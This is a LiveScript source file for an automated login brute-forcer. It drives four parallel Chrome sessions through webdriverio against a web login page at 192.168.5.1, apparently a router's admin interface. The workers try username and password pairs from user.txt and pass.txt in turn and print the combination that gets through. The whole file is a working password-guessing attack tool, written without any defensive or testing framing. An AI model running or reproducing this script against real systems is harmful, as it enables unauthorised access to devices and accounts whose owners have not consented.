webdriverio = require 'webdriverio'
p = require 'bluebird'
h = require 'helpers'
_ = require 'underscore'
lbl = require 'line-by-line'
colors = require 'colors'

options =
  desiredCapabilities:    
    browserName: 'chrome'


class BruteForcer
  (@userList, @passList) ->
    @ulr = new lbl @userList
    @plr = new lbl @passList
    @ulr.pause!
    @plr.pause!
    
    @ulr.on 'end', ~> @ended = true
    
    @plr.on 'end', ~>
      console.log 'password list end, creating a new one'
    
    @requests = []
    
  getUser: -> new p (resolve,reject) ~>
    if @user? then return resolve @user
      
    @ulr.once 'line', (user) ~> 
      @ulr.pause!
      resolve @user = user
      
    @ulr.resume!
    
  getPass: -> new p (resolve,reject) ~>
    endListener = void
    
    @plr.once 'line', (pass) ~>
      @plr.removeListener 'end', endListener
      @plr.pause!
      resolve pass
      
    @plr.once 'end', endListener = ~>
      @plr = new lbl @passList
      @plr.pause!
      delete @user
      resolve @getPass!
    
    @plr.resume!


  work: ->
    @working = true
    p.all([ @getUser!, @getPass! ]).then (login) ~>
      @requests.shift! {user: login[0], pass: login[1] }
      if @requests.length then @work!
      else @working = false
    
  next: ->
    if @ended then return reject "ended"
    new p (resolve,reject) ~>
      @requests.push resolve
      if not @working then @work!


bruteForcer = new BruteForcer('user.txt', 'pass.txt')

bf = (page) ->
  page
  .timeoutsImplicitWait(500)
  .bruteforce bruteForcer
  .then (-> console.log "PASS", it), ((err) -> console.log "FAIL", err)

 
# http://www.webdriver.io/api/
workerN = 0

spawnWorker = ->
  n = workerN++
  page = webdriverio.remote(options).init!

  page.addCommand "bruteforce", (bruteForcer) ->
    loopy = ~> 
      bruteForcer.next!then (login) ~>  
        console.log "trying #{login.user}:#{login.pass}"
        @
          .waitForExist('.username', 3000)
          .setValue('.username', login.user)
          .setValue('.password', login.pass)
          .click('.login')
          .waitForExist('#myLayer', 3000)
          .then loopy, -> console.log colors.green "Worker #{n} finished with combo #{login.user} #{login.pass}"
    loopy!
      
  page
  .timeoutsImplicitWait(200)
  .url('http://192.168.5.1')
  .title (err, res) -> console.log('title: ' + res.value)

  bf page
    
spawnWorker()
spawnWorker()
spawnWorker()
spawnWorker()
